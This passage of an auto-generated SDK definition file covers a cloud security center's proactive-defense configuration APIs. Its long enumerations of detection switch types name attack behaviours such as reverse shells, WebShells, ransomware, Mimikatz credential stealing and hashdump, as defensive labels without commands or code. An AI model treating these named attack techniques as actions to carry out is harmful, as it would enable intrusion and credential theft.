*   **USER-ENABLE-SWITCH-TYPE_50870**: Rebound Shell
*   **USER-ENABLE-SWITCH-TYPE_50873**: WebShell execute command
*   **USER-ENABLE-SWITCH-TYPE_50876**: Against security software
*   **USER-ENABLE-SWITCH-TYPE_50877**: Malicious soft communication
*   **USER-ENABLE-SWITCH-TYPE_50884**: Suspicious worm script behavior
*   **USER-ENABLE-SWITCH-TYPE_50885**: malicious script behavior
*   **USER-ENABLE-SWITCH-TYPE_50983**: obfuscated command
*   **USER-ENABLE-SWITCH-TYPE_51200**: Command line download and run malicious files
*   **USER-ENABLE-SWITCH-TYPE_51201**: ransomware
*   **USER-ENABLE-SWITCH-TYPE_51202**: Suspected Extortion
*   **USER-ENABLE-SWITCH-TYPE_53168**: process debugging
*   **USER-ENABLE-SWITCH-TYPE_53272**: Exploiting Kernel Vulnerabilities to Elevate Privileges
*   **USER-ENABLE-SWITCH-TYPE_54034**: Intranet scan
*   **USER-ENABLE-SWITCH-TYPE_54265**: Hijacking the PAM Module
*   **USER-ENABLE-SWITCH-TYPE_54395**: Unauthorized reading and writing of sensitive files
*   **USER-ENABLE-SWITCH-TYPE_54699**: Hijack dynamic link library
*   **USER-ENABLE-SWITCH-TYPE_54953**: Hashdump Attack
*   **USER-ENABLE-SWITCH-TYPE_57897**: suspected privilege escalation
*   **USER-ENABLE-SWITCH-TYPE_62981**: Bypassing security monitoring
*   **USER-ENABLE-SWITCH-TYPE_64025**: Ingress service execute command [enhanced mode]
*   **USER-ENABLE-SWITCH-TYPE_39659**: Sensitive Registry Key Protection
*   **USER-ENABLE-SWITCH-TYPE_51225**: Powershell executes high-risk commands
*   **USER-ENABLE-SWITCH-TYPE_51226**: Powershell execute suspicious command
*   **USER-ENABLE-SWITCH-TYPE_51228**: High-risk lateral penetration tools
*   **USER-ENABLE-SWITCH-TYPE_51229**: Browser service execution a high-risk operation
*   **USER-ENABLE-SWITCH-TYPE_51230**: Entrance service execution suspicious operation
*   **USER-ENABLE-SWITCH-TYPE_51232**: System processes execution high-risk operations
*   **USER-ENABLE-SWITCH-TYPE_51233**: Java service execution high-risk operations
*   **USER-ENABLE-SWITCH-TYPE_51234**: Office components execution high-risk operations
*   **USER-ENABLE-SWITCH-TYPE_51235**: Web service performs high-risk operations
*   **USER-ENABLE-SWITCH-TYPE_51236**: Rebound shells
*   **USER-ENABLE-SWITCH-TYPE_52815**: Load high-risk drivers
*   **USER-ENABLE-SWITCH-TYPE_52816**: high-risk account manipulation behavior
*   **USER-ENABLE-SWITCH-TYPE_52818**: Information detection
*   **USER-ENABLE-SWITCH-TYPE_52820**: Create malicious files
*   **USER-ENABLE-SWITCH-TYPE_52821**: Suspicious process startup
*   **USER-ENABLE-SWITCH-TYPE_52823**: Running high-risk ARK tools
*   **USER-ENABLE-SWITCH-TYPE_52825**: Unauthorized execution of high-risk orders
*   **USER-ENABLE-SWITCH-TYPE_52826**: Entrance service execution high-risk operation
*   **USER-ENABLE-SWITCH-TYPE_52827**: Ransomware
*   **USER-ENABLE-SWITCH-TYPE_52828**: Suspected Extortion
*   **USER-ENABLE-SWITCH-TYPE_52829**: delete system backup behavior
*   **USER-ENABLE-SWITCH-TYPE_54168**: LSA security permission service protection
*   **USER-ENABLE-SWITCH-TYPE_54365**: Create service autorun item
*   **USER-ENABLE-SWITCH-TYPE_54366**: Create high-risk autorun item
*   **USER-ENABLE-SWITCH-TYPE_54367**: Create scheduled task autorun item
*   **USER-ENABLE-SWITCH-TYPE_54368**: Create registry autorun item
*   **USER-ENABLE-SWITCH-TYPE_54369**: Create WMI autorun item
*   **USER-ENABLE-SWITCH-TYPE_54373**: Against security software
*   **USER-ENABLE-SWITCH-TYPE_54374**: Intrusion trace cleanup
*   **USER-ENABLE-SWITCH-TYPE_54384**: Hashdump Attack
*   **USER-ENABLE-SWITCH-TYPE_55251**: Database services execution high-risk operations
*   **USER-ENABLE-SWITCH-TYPE_57242**: Malicious command execution
*   **USER-ENABLE-SWITCH-TYPE_57340**: Command line download and run malicious files
*   **USER-ENABLE-SWITCH-TYPE_62357**: Cloud Assistant service information detection
*   **USER-ENABLE-SWITCH-TYPE_63725**: Ingress service implants suspicious script/binary file', example='kdump_switch'),
  }(name='OverallConfig', description='The information about the feature.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='6D9CDB47-6191-4415-BE63-7E8B12CD4FBE'),
}

model DescribeCommonOverallConfigResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeCommonOverallConfigResponseBody(name='body'),
}

/**
 * @summary Queries the information about a specified feature.
 *
 * @param request DescribeCommonOverallConfigRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeCommonOverallConfigResponse
 */
async function describeCommonOverallConfigWithOptions(request: DescribeCommonOverallConfigRequest, runtime: Util.RuntimeOptions): DescribeCommonOverallConfigResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeCommonOverallConfig',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the information about a specified feature.
 *
 * @param request DescribeCommonOverallConfigRequest
 * @return DescribeCommonOverallConfigResponse
 */
async function describeCommonOverallConfig(request: DescribeCommonOverallConfigRequest): DescribeCommonOverallConfigResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeCommonOverallConfigWithOptions(request, runtime);
}

model DescribeCommonOverallConfigListRequest {
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='119.136.XX.XX'),
  typeList?: [ string ](name='TypeList', description='The types of the configuration items.

>  You can query up to 50 types at a time.

This parameter is required.'),
}

model DescribeCommonOverallConfigListResponseBody = {
  overallList?: [ 
    {
      authVersionList?: [ string ](name='AuthVersionList', description='The editions of Security Center.'),
      config?: string(name='Config', description='Indicates the status of the switch. Valid values:

*   **off**
*   **on**', example='on'),
      totalCount?: int32(name='TotalCount', description='The total number of entries that are returned.', example='184'),
      type?: string(name='Type', description='The type of the configuration. Valid values:

*   **kdump_switch**: Active defense experience optimization.
*   **threat_detect**: Adaptive threat detection.
*   **suspicious_aggregation**: Alert association.
*   **alidetect**: File detection.
*   **USER-ENABLE-SWITCH-TYPE_38857**: Entrance service performs high-risk operations (Linux).
*   **USER-ENABLE-SWITCH-TYPE_50858**: Web service performs high-risk operations (Linux).
*   **USER-ENABLE-SWITCH-TYPE_50859**: Entrance service performs suspicious operations (Linux).
*   **USER-ENABLE-SWITCH-TYPE_50862**: Cloud Assistant advanced protection (Linux).
*   **USER-ENABLE-SWITCH-TYPE_50867**: Injects malicious files (Linux).
*   **USER-ENABLE-SWITCH-TYPE_50868**: Injects suspicious files (Linux).
*   **USER-ENABLE-SWITCH-TYPE_64025**: Entrance service executes commands in an enhanced mode (Linux).
*   **USER-ENABLE-SWITCH-TYPE_51229**: Browser service performs high-risk operations (Windows).
*   **USER-ENABLE-SWITCH-TYPE_51230**: Entrance service performs suspicious operations (Windows).
*   **USER-ENABLE-SWITCH-TYPE_51232**: System processes perform high-risk operations (Windows).
*   **USER-ENABLE-SWITCH-TYPE_51233**: Java service performs high-risk operations (Windows).
*   **USER-ENABLE-SWITCH-TYPE_51234**: Office components perform high-risk operations (Windows).
*   **USER-ENABLE-SWITCH-TYPE_51235**: Web service performs high-risk operations (Windows).
*   **USER-ENABLE-SWITCH-TYPE_52820**: Injects malicious files (Windows).
*   **USER-ENABLE-SWITCH-TYPE_52826**: Entrance service performs high-risk operations (Windows).
*   **USER-ENABLE-SWITCH-TYPE_55251**: Database services perform high-risk operations (Windows).
*   **USER-ENABLE-SWITCH-TYPE_63725**: Entrance service injects suspicious scripts or binary files (Windows).
*   **USER-ENABLE-SWITCH-TYPE_3277**: Suspicious process startup (Linux).
*   **USER-ENABLE-SWITCH-TYPE_50983**: Obfuscated commands (Linux).
*   **USER-ENABLE-SWITCH-TYPE_51200**: Uses command line to download and run malicious files (Linux).
*   **USER-ENABLE-SWITCH-TYPE_71131**: Entrance service executes sequence of suspicious behavior (Linux).
*   **USER-ENABLE-SWITCH-TYPE_51225**: Powershell executes high-risk commands (Windows).
*   **USER-ENABLE-SWITCH-TYPE_51226**: Powershell executes suspicious commands (Windows).
*   **USER-ENABLE-SWITCH-TYPE_52821**: Suspicious process startup (Windows).
*   **USER-ENABLE-SWITCH-TYPE_57242**: Malicious command execution (Windows).
*   **USER-ENABLE-SWITCH-TYPE_57340**: Uses command line to download and run malicious files (Windows).
*   **USER-ENABLE-SWITCH-TYPE_39659**: Sensitive registry key protection (Windows).
*   **USER-ENABLE-SWITCH-TYPE_52816**: High-risk account manipulation behavior (Windows).
*   **USER-ENABLE-SWITCH-TYPE_54365**: Creates service auto-startup items (Windows).
*   **USER-ENABLE-SWITCH-TYPE_54366**: Creates high-risk auto-startup items (Windows).
*   **USER-ENABLE-SWITCH-TYPE_54367**: Creates scheduled task auto-startup items (Windows).
*   **USER-ENABLE-SWITCH-TYPE_54368**: Creates registry auto-startup items (Windows).
*   **USER-ENABLE-SWITCH-TYPE_54369**: Creates WMI auto-startup items (Windows).
*   **USER-ENABLE-SWITCH-TYPE_50869**: Unauthorized execution of high-risk commands (Linux).
*   **USER-ENABLE-SWITCH-TYPE_53272**: Exploits kernel vulnerabilities to elevate privileges (Linux).
*   **USER-ENABLE-SWITCH-TYPE_54395**: Unauthorized reading and writing of sensitive files (Linux).
*   **USER-ENABLE-SWITCH-TYPE_57897**: Suspected privilege escalation (Linux).
*   **USER-ENABLE-SWITCH-TYPE_52825**: Unauthorized execution of high-risk commands (Windows).
*   **USER-ENABLE-SWITCH-TYPE_5507**: Malicious drivers (Linux).
*   **USER-ENABLE-SWITCH-TYPE_50876**: Uninstalls security software (Linux).
*   **USER-ENABLE-SWITCH-TYPE_53168**: Process debugging (Linux).
*   **USER-ENABLE-SWITCH-TYPE_54699**: Hijacks dynamic link library (Linux).
*   **USER-ENABLE-SWITCH-TYPE_62981**: Bypasses security monitoring (Linux).
*   **USER-ENABLE-SWITCH-TYPE_52815**: Loads high-risk drivers (Windows).
*   **USER-ENABLE-SWITCH-TYPE_52823**: Runs high-risk anti-rootkit (ARK) tools (Windows).
*   **USER-ENABLE-SWITCH-TYPE_54373**: Uninstalls security software (Windows).
*   **USER-ENABLE-SWITCH-TYPE_54374**: Intrusion trace cleanup (Windows).
*   **USER-ENABLE-SWITCH-TYPE_54265**: Hijacks the pluggable authentication module (PAM) (Linux).
*   **USER-ENABLE-SWITCH-TYPE_54953**: Hashdump attack (Linux).
*   **USER-ENABLE-SWITCH-TYPE_54383**: MimiKatz credential stealing (Windows).
*   **USER-ENABLE-SWITCH-TYPE_54384**: Hashdump attack (Windows).
*   **USER-ENABLE-SWITCH-TYPE_50861**: Information detection (Linux).
*   **USER-ENABLE-SWITCH-TYPE_52818**: Information detection (Windows).
*   **USER-ENABLE-SWITCH-TYPE_54034**: Intranet scan (Linux).
*   **USER-ENABLE-SWITCH-TYPE_51228**: High-risk lateral penetration tools (Windows).
*   **USER-ENABLE-SWITCH-TYPE_50870**: Rebound shell (Linux).
*   **USER-ENABLE-SWITCH-TYPE_50873**: WebShell executes commands.
*   **USER-ENABLE-SWITCH-TYPE_51236**: Rebound shell (Windows).
*   **USER-ENABLE-SWITCH-TYPE_50877**: Malicious program communication (Linux).
*   **USER-ENABLE-SWITCH-TYPE_50884**: Suspicious worm script behavior (Linux).
*   **USER-ENABLE-SWITCH-TYPE_50885**: Malicious script behavior (Linux).
*   **USER-ENABLE-SWITCH-TYPE_51201**: Ransomware (Linux).
*   **USER-ENABLE-SWITCH-TYPE_51202**: Suspected extortion (Linux).
*   **USER-ENABLE-SWITCH-TYPE_52827**: Ransomware (Windows).
*   **USER-ENABLE-SWITCH-TYPE_52828**: Suspected extortion (Windows).
*   **USER-ENABLE-SWITCH-TYPE_52829**: Deletes system backup behavior (Windows).', example='kdump_switch'),
    }
  ](name='OverallList', description='The information about the configuration items.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='CE500770-42D3-442E-9DDD-156E0F9F3B45'),
}

model DescribeCommonOverallConfigListResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeCommonOverallConfigListResponseBody(name='body'),
}

/**
 * @summary Queries the configurations of features in proactive defense.
 *
 * @param request DescribeCommonOverallConfigListRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeCommonOverallConfigListResponse
 */
async function describeCommonOverallConfigListWithOptions(request: DescribeCommonOverallConfigListRequest, runtime: Util.RuntimeOptions): DescribeCommonOverallConfigListResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.typeList)) {
    query['TypeList'] = request.typeList;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeCommonOverallConfigList',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the configurations of features in proactive defense.
 *
 * @param request DescribeCommonOverallConfigListRequest
 * @return DescribeCommonOverallConfigListResponse
 */
async function describeCommonOverallConfigList(request: DescribeCommonOverallConfigListRequest): DescribeCommonOverallConfigListResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeCommonOverallConfigListWithOptions(request, runtime);
}

model DescribeCommonTargetConfigRequest {
  type?: string(name='Type', description='The configuration type. Valid values:

*   **kdump_switch**: Active defense experience optimization.
*   **threat_detect**: Adaptive threat detection.
*   **containerNetwork**: Container network topology.
*   **interceptionSwitch**: Cluster microsegmentation.
*   **suspicious_aggregation**: Alert association.
*   **alidetect**: File detection.
*   **USER-ENABLE-SWITCH-TYPE_38857**: Entrance service performs high-risk operations (Linux).
*   **USER-ENABLE-SWITCH-TYPE_50858**: Web service performs high-risk operations (Linux).
*   **USER-ENABLE-SWITCH-TYPE_50859**: Entrance service performs suspicious operations (Linux).
*   **USER-ENABLE-SWITCH-TYPE_50862**: Cloud Assistant advanced protection for Linux.
*   **USER-ENABLE-SWITCH-TYPE_50867**: Injects malicious files (Linux).
*   **USER-ENABLE-SWITCH-TYPE_50868**: Injects suspicious files (Linux).
*   **USER-ENABLE-SWITCH-TYPE_64025**: Entrance service executes commands in an enhanced mode (Linux).
*   **USER-ENABLE-SWITCH-TYPE_51229**: Browser service performs high-risk operations (Windows).
*   **USER-ENABLE-SWITCH-TYPE_51230**: Entrance service performs suspicious operations (Windows).
*   **USER-ENABLE-SWITCH-TYPE_51232**: System processes perform high-risk operations (Windows).
*   **USER-ENABLE-SWITCH-TYPE_51233**: Java service performs high-risk operations (Windows).
*   **USER-ENABLE-SWITCH-TYPE_51234**: Office components perform high-risk operations (Windows).
*   **USER-ENABLE-SWITCH-TYPE_51235**: Web service performs high-risk operations (Windows).
*   **USER-ENABLE-SWITCH-TYPE_52820**: Injects malicious files (Windows).
*   **USER-ENABLE-SWITCH-TYPE_52826**: Entrance service performs high-risk operations (Windows).
*   **USER-ENABLE-SWITCH-TYPE_55251**: Database services perform high-risk operations (Windows).
*   **USER-ENABLE-SWITCH-TYPE_63725**: Entrance service injects suspicious scripts or binary files (Windows).
*   **USER-ENABLE-SWITCH-TYPE_3277**: Suspicious process startup (Linux).
*   **USER-ENABLE-SWITCH-TYPE_50983**: Obfuscated commands (Linux).
*   **USER-ENABLE-SWITCH-TYPE_51200**: Uses command line to download and run malicious files (Linux).
*   **USER-ENABLE-SWITCH-TYPE_71131**: Entrance service executes sequence of suspicious behavior (Linux).
*   **USER-ENABLE-SWITCH-TYPE_51225**: Powershell executes high-risk commands (Windows).
*   **USER-ENABLE-SWITCH-TYPE_51226**: Powershell executes suspicious commands (Windows).
*   **USER-ENABLE-SWITCH-TYPE_52821**: Suspicious process startup (Windows).
*   **USER-ENABLE-SWITCH-TYPE_57242**: Malicious command execution (Windows).
*   **USER-ENABLE-SWITCH-TYPE_57340**: Uses command line to download and run malicious files (Windows).
*   **USER-ENABLE-SWITCH-TYPE_39659**: Sensitive registry key protection (Windows).
*   **USER-ENABLE-SWITCH-TYPE_52816**: High-risk account manipulation behavior (Windows).
*   **USER-ENABLE-SWITCH-TYPE_54365**: Creates service auto-startup items (Windows).
*   **USER-ENABLE-SWITCH-TYPE_54366**: Creates high-risk auto-startup items (Windows).
*   **USER-ENABLE-SWITCH-TYPE_54367**: Creates scheduled task auto-startup items (Windows).
*   **USER-ENABLE-SWITCH-TYPE_54368**: Creates registry auto-startup items (Windows).
*   **USER-ENABLE-SWITCH-TYPE_54369**: Creates WMI auto-startup items (Windows).
*   **USER-ENABLE-SWITCH-TYPE_50869**: Unauthorized execution of high-risk commands (Linux).
*   **USER-ENABLE-SWITCH-TYPE_53272**: Exploits kernel vulnerabilities to elevate privileges (Linux).
*   **USER-ENABLE-SWITCH-TYPE_54395**: Unauthorized reading and writing of sensitive files (Linux).
*   **USER-ENABLE-SWITCH-TYPE_57897**: Suspected privilege escalation (Linux).
*   **USER-ENABLE-SWITCH-TYPE_52825**: Unauthorized execution of high-risk commands (Windows).
*   **USER-ENABLE-SWITCH-TYPE_5507**: Malicious drivers (Linux).
*   **USER-ENABLE-SWITCH-TYPE_50876**: Uninstalls security software (Linux).
*   **USER-ENABLE-SWITCH-TYPE_53168**: Process debugging (Linux).
*   **USER-ENABLE-SWITCH-TYPE_54699**: Hijacks dynamic link library (Linux).
*   **USER-ENABLE-SWITCH-TYPE_62981**: Bypasses security monitoring (Linux).
*   **USER-ENABLE-SWITCH-TYPE_52815**: Loads high-risk drivers (Windows).
*   **USER-ENABLE-SWITCH-TYPE_52823**: Runs high-risk anti-rootkit (ARK) tools (Windows).
*   **USER-ENABLE-SWITCH-TYPE_54373**: Uninstalls security software (Windows).
*   **USER-ENABLE-SWITCH-TYPE_54374**: Intrusion trace cleanup (Windows).
*   **USER-ENABLE-SWITCH-TYPE_54265**: Hijacks the pluggable authentication module (PAM) (Linux).
*   **USER-ENABLE-SWITCH-TYPE_54953**: Hashdump attack (Linux).
*   **USER-ENABLE-SWITCH-TYPE_54383**: MimiKatz credential stealing (Windows).
*   **USER-ENABLE-SWITCH-TYPE_54384**: Hashdump attack (Windows).
*   **USER-ENABLE-SWITCH-TYPE_50861**: Information detection (Linux).
*   **USER-ENABLE-SWITCH-TYPE_52818**: Information detection (Windows).
*   **USER-ENABLE-SWITCH-TYPE_54034**: Intranet scan (Linux).
*   **USER-ENABLE-SWITCH-TYPE_51228**: High-risk lateral penetration tools (Windows).
*   **USER-ENABLE-SWITCH-TYPE_50870**: Rebound shell (Linux).
*   **USER-ENABLE-SWITCH-TYPE_50873**: WebShell executes commands.
*   **USER-ENABLE-SWITCH-TYPE_51236**: Rebound shell (Windows).
*   **USER-ENABLE-SWITCH-TYPE_50877**: Malicious program communication (Linux).
*   **USER-ENABLE-SWITCH-TYPE_50884**: Suspicious worm script behavior (Linux).
*   **USER-ENABLE-SWITCH-TYPE_50885**: Malicious script behavior (Linux).
*   **USER-ENABLE-SWITCH-TYPE_51201**: Ransomware (Linux).
*   **USER-ENABLE-SWITCH-TYPE_51202**: Suspected extortion (Linux).
*   **USER-ENABLE-SWITCH-TYPE_52827**: Ransomware (Windows).
*   **USER-ENABLE-SWITCH-TYPE_52828**: Suspected extortion (Windows).
*   **USER-ENABLE-SWITCH-TYPE_52829**: Deletes system backup behavior (Windows).

This parameter is required.', example='kdump_switch'),
}

model DescribeCommonTargetConfigResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='09969D2C-4FAD-429E-BFBF-9A60DEF8BF6F'),
  targetList?: [ 
    {
      flag?: string(name='Flag', description='The mode in which the configuration takes effect. Valid values:

*   **add**: In this mode, the configuration takes effect on the assets.
*   **del**: In this mode, the configuration does not take effect on the assets.', example='add'),
      target?: string(name='Target', description='The ID of the asset on which the configuration takes effect.

> 

*   When you set the **TargetType** parameter to **uuid**, the value of this parameter indicates the UUID of an asset.

*   When you set the **TargetType** parameter to **Cluster**, the value of this parameter indicates the ID of a cluster.

*   When you set the **TargetType** parameter to **image_repo**, the value of this parameter indicates the ID of an image repository.', example='c23551de6149343e8a54e69fbefe6****'),
      targetType?: string(name='TargetType', description='The dimension from on which the feature was configured. Valid values:

*   **uuid**: the UUID of the asset
*   **Cluster**: the ID of the cluster
*   **image_repo**: the ID of the image repository', example='image_repo'),
    }
  ](name='TargetList', description='An array that consists of the details of the configuration items.'),
}

model DescribeCommonTargetConfigResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeCommonTargetConfigResponseBody(name='body'),
}

/**
 * @summary Queries the configurations of the proactive defense feature.
 *
 * @param request DescribeCommonTargetConfigRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeCommonTargetConfigResponse
 */
async function describeCommonTargetConfigWithOptions(request: DescribeCommonTargetConfigRequest, runtime: Util.RuntimeOptions): DescribeCommonTargetConfigResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeCommonTargetConfig',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the configurations of the proactive defense feature.
 *
 * @param request DescribeCommonTargetConfigRequest
 * @return DescribeCommonTargetConfigResponse
 */
async function describeCommonTargetConfig(request: DescribeCommonTargetConfigRequest): DescribeCommonTargetConfigResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeCommonTargetConfigWithOptions(request, runtime);
}

model DescribeCommonTargetResultListRequest {
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='113.57.XX.XX'),
  type?: string(name='Type', description='The type of the configuration item. Valid values:

*   **webshell_timescan**: webshell detection and removal
*   **aliscriptengine**: in-depth detection engine
*   **alidetect**: installation scope of local file detection
*   **alidetect-scan-enable**: detection scope of local file detection

>  You can call the [ListClientUserDefineRules](~~ListClientUserDefineRules~~) and [ListSystemClientRules](~~ListSystemClientRules~~) operations to obtain more types of custom and system configuration items.

This parameter is required.', example='webshell_timescan'),
}

model DescribeCommonTargetResultListResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='6673D49C-A9AB-40DD-B4A2-B92306701AE7'),
  targetConfig?: {
    flag?: string(name='Flag', description='The identifier that indicates whether the configuration item is applied to the server. Valid values:

*   **add**: applied
*   **del**: not applied', example='del'),
    targetDefault?: string(name='TargetDefault', description='The default identifier.', example='add'),
    targetList?: [ string ](name='TargetList', description='An array that consists of the IDs of the server groups or the UUIDs of the servers.

>  If **uuid** is returned for the **TargetType** parameter, **UUIDs** of the servers are returned. If **groupId** is returned for the **TargetType** parameter, IDs of the server groups are returned.'),
    targetType?: string(name='TargetType', description='The type of the server to which the configuration item is applied. Valid values:

*   **uuid**: a server
*   **groupId**: a server group', example='uuid'),
    totalCount?: string(name='TotalCount', description='The total number of entries returned.', example='22'),
    type?: string(name='Type', description='The type of the configuration item. Valid values:

*   **webshell_timescan**: webshell detection and removal
*   **aliscriptengine**: in-depth detection engine
*   **alidetect**: installation scope of local file detection
*   **alidetect-scan-enable**: detection scope of local file detection', example='webshell_timescan'),
  }(name='TargetConfig', description='The information about the configuration item.'),
}

model DescribeCommonTargetResultListResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeCommonTargetResultListResponseBody(name='body'),
}

/**
 * @summary Queries the information about the servers based on the specified configuration item.
 *
 * @param request DescribeCommonTargetResultListRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeCommonTargetResultListResponse
 */
async function describeCommonTargetResultListWithOptions(request: DescribeCommonTargetResultListRequest, runtime: Util.RuntimeOptions): DescribeCommonTargetResultListResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeCommonTargetResultList',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the information about the servers based on the specified configuration item.
 *
 * @param request DescribeCommonTargetResultListRequest
 * @return DescribeCommonTargetResultListResponse
 */
async function describeCommonTargetResultList(request: DescribeCommonTargetResultListRequest): DescribeCommonTargetResultListResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeCommonTargetResultListWithOptions(request, runtime);
}

model DescribeConcernNecessityRequest {
  lang?: string(name='Lang', description='The language of the content within the request and response. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
}

model DescribeConcernNecessityResponseBody = {
  concernNecessity?: [ string ](name='ConcernNecessity', description='The priorities to fix the vulnerabilities. Valid values:

*   asap: high
*   later: medium
*   nntf: low'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='ECC6B3E3-D496-512D-B46D-E6996A6B63EE'),
}

model DescribeConcernNecessityResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeConcernNecessityResponseBody(name='body'),
}

/**
 * @summary Queries the priorities to fix vulnerabilities.
 *
 * @param request DescribeConcernNecessityRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeConcernNecessityResponse
 */
async function describeConcernNecessityWithOptions(request: DescribeConcernNecessityRequest, runtime: Util.RuntimeOptions): DescribeConcernNecessityResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeConcernNecessity',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the priorities to fix vulnerabilities.
 *
 * @param request DescribeConcernNecessityRequest
 * @return DescribeConcernNecessityResponse
 */
async function describeConcernNecessity(request: DescribeConcernNecessityRequest): DescribeConcernNecessityResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeConcernNecessityWithOptions(request, runtime);
}

model DescribeContainerAppsRequest {
  clusterId?: string(name='ClusterId', description='The ID of the container cluster.', example='ca0a686115432429ca26cf780f5e9fff5'),
  currentPage?: int32(name='CurrentPage', description='The page number.

This parameter is required.', example='1'),
  fieldValue?: string(name='FieldValue', description='The application value that you want to query. Fuzzy match is supported.', example='cas-adad-qeqwe'),
  pageSize?: int32(name='PageSize', description='The number of entries per page. Default value: 20. If you leave this parameter empty, 20 entries are returned on each page.

>  We recommend that you do not leave this parameter empty.

This parameter is required.', example='200'),
}

model DescribeContainerAppsResponseBody = {
  requestId?: string(name='RequestId', description='The request ID.', example='30CBF632-109F-596F-97F2-451C8B2A****'),
  tagValues?: [ string ](name='TagValues', description='The tag values.'),
}

model DescribeContainerAppsResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeContainerAppsResponseBody(name='body'),
}

/**
 * @summary Queries the information about a containerized application.
 *
 * @param request DescribeContainerAppsRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeContainerAppsResponse
 */
async function describeContainerAppsWithOptions(request: DescribeContainerAppsRequest, runtime: Util.RuntimeOptions): DescribeContainerAppsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.clusterId)) {
    query['ClusterId'] = request.clusterId;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.fieldValue)) {
    query['FieldValue'] = request.fieldValue;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeContainerApps',
    version = '2018-12-03',
